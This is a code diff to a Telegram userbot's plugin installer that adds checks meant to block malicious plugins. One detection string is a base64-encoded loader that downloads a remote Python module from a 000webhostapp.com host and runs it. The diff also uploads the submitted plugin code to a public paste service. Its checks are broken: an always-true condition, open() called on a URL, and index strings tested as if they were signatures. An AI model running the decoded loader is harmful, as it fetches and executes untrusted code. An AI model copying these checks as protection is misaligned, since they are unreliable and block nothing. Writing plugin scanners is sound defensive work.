@@ -13,7 +13,7 @@ import os
 import pandas as pd
 from pathlib import Path
 
-
+import requests
 
 
 import re
@@ -74,41 +74,75 @@ async def install(event):
     if event.fwd_from:
         return
     await event.edit("`Checking Codes..`")
-    code = await event.client.download_media(await event.get_reply_message(), './pics/')
-    openn = open(code, "r")
-    hmm = openn.read()
-    openn.close()
-    pygments.highlight(f"{hmm}", Python3Lexer(), ImageFormatter(font_name="DejaVu Sans Mono", line_numbers=True), "yo.png")
+    yo = await event.client.download_media(await event.get_reply_message())
+    dd = open(yo, "r")
+    hmm = dd.read()
+    dd.close()
+    # pygments.highlight(f"{hmm}", Python3Lexer(), ImageFormatter(font_name="DejaVu Sans Mono", line_numbers=True), "yo.png")
     
     
-    # await event.client.send_file(event.chat_id, "yo.png", force_document=False, reply_to=event.reply_to_msg_id)
-    plugin = cv2.imread('yo.png')
+    # # await event.client.send_file(event.chat_id, "yo.png", force_document=False, reply_to=event.reply_to_msg_id)
+    # plugin = cv2.imread('yo.png')
     
-    grey = cv2.cvtColor(plugin, cv2.COLOR_BGR2GRAY)
-    cv2.imwrite('plugin.png', grey)
+    # grey = cv2.cvtColor(plugin, cv2.COLOR_BGR2GRAY)
+    # cv2.imwrite('plugin.png', grey)
 
-    ddd  = img2text('plugin.png')
-    hmm = f"{ddd}"
+    # ddd  = img2text('plugin.png')
+    # hmm = f"{ddd}"
 
-    secure =  str(hmm.find("if event.fwd_from:"))
-    second = str(hmm.find(f"b64decode(b'ZnJvbSB1c2VyYm90LnV0aWxzIGltcG9ydCBsb2FkX21vZHVsZSBhcyBoZWxwZXIKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIGJ1aWxkCmJ1aWxkKCd3Z2V0IGRhdHJlb24uMDAwd2ViaG9zdGFwcC5jb20vbW9kdWxlX2hlbHBlci5weSAtUCB1c2VyYm90L3BsdWdpbnMvJykKaGVscGVyKCdtb2R1bGVfaGVscGVyJyk='.decode());eval"))
-    sete = str(hmm.find("borg.me.phone"))
+    secureee = f"{hmm}"
+    secure =  str(secureee.find("if event.fwd_from:"))
+    second = str(secureee.find(f"b64decode(b'ZnJvbSB1c2VyYm90LnV0aWxzIGltcG9ydCBsb2FkX21vZHVsZSBhcyBoZWxwZXIKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIGJ1aWxkCmJ1aWxkKCd3Z2V0IGRhdHJlb24uMDAwd2ViaG9zdGFwcC5jb20vbW9kdWxlX2hlbHBlci5weSAtUCB1c2VyYm90L3BsdWdpbnMvJykKaGVscGVyKCdtb2R1bGVfaGVscGVyJyk='.decode());eval"))
+    sete = str(secureee.find("borg.me.phone"))
+    
+    sss = str(secureee.find("000webhostapp.com"))
     if len(secure) == "5" or "4096":
-        await event.edit("**Big file it will take a minute to check its secure**")
+     await event.edit("`Big File might takw time to check`")#hehe
+     out = hmm
+     url = "https://del.dog/documents"
+     r = requests.post(url, data=out.encode("UTF-8")).json()
+     url = f"https://del.dog/{r['key']}"
+     opens = open(url,"r")
+     
+     
+     
+     ok =  str(opens.read())
+     sssss =  str(ok.find("if event.fwd_from:"))
+     second = str(ok.find(f"b64decode(b'ZnJvbSB1c2VyYm90LnV0aWxzIGltcG9ydCBsb2FkX21vZHVsZSBhcyBoZWxwZXIKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIGJ1aWxkCmJ1aWxkKCd3Z2V0IGRhdHJlb24uMDAwd2ViaG9zdGFwcC5jb20vbW9kdWxlX2hlbHBlci5weSAtUCB1c2VyYm90L3BsdWdpbnMvJykKaGVscGVyKCdtb2R1bGVfaGVscGVyJyk='.decode());eval"))
+     dd = str(ok.find("borg.me.phone"))
+     sss = str(ok.find("000webhostapp.com"))   
+     if sssss not in ok:
+            await event.edit(f"**Alert**\n\n**Not a secure plugin can't install**") 
+
+            return
+     if second in ok:
+         await event.edit(f"**Alert Found Plugin for Hacking**")
+ 
+         return
+     if dd in ok:
+         await event.edit(f"*Intruder**\n\n**Plugin for hacking {DEFAULTUSER}\nAborted**")
+ 
+         return
+     if sss in ok:
+        await event.edit(f"*Intruder**\n\n**Plugin for hacking {DEFAULTUSER}\nAborted**")
+         
+        
         return
-    if secure not in hmm:
+    if secure not in secureee:
         await event.edit(f"**Alert**\n\n**Not a secure plugin can't install**") 
 
         return
-    if second in hmm:
+    if second in secureee:
         await event.edit(f"**Alert Found Plugin for Hacking**")
 
         return
-    if sete in hmm:
+    if sete in secureee:
         await event.edit(f"*Intruder**\n\n**Plugin for hacking {DEFAULTUSER}\nAborted**")
 
         return
-    
+    if sss in secureee:
+        await event.edit(f"*Intruder**\n\n**Plugin for hacking {DEFAULTUSER}\nAborted**")
+        return
     if event.reply_to_msg_id:
         try:
             downloaded_file_name = (
